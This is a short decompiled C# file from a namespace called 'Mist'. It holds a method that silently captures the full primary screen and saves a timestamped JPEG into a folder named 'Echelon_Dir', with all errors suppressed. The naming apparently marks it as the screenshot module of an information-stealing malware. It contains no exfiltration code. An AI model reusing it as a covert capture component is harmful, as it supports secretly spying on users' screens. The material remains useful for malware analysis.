using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;

namespace Mist
{
	// Token: 0x02000056 RID: 86
	internal class Screenshot
	{
		// Token: 0x06000238 RID: 568 RVA: 0x000108DC File Offset: 0x0000EADC
		public static void GetScreenShot(string Echelon_Dir)
		{
			try
			{
				int width = Screen.PrimaryScreen.Bounds.Width;
				int height = Screen.PrimaryScreen.Bounds.Height;
				Bitmap bitmap = new Bitmap(width, height);
				Graphics.FromImage(bitmap).CopyFromScreen(0, 0, 0, 0, bitmap.Size);
				bitmap.Save(Echelon_Dir + "\\ScreenShot_" + Help.dateLog + ".Jpeg", ImageFormat.Jpeg);
			}
			catch
			{
			}
		}
	}
}
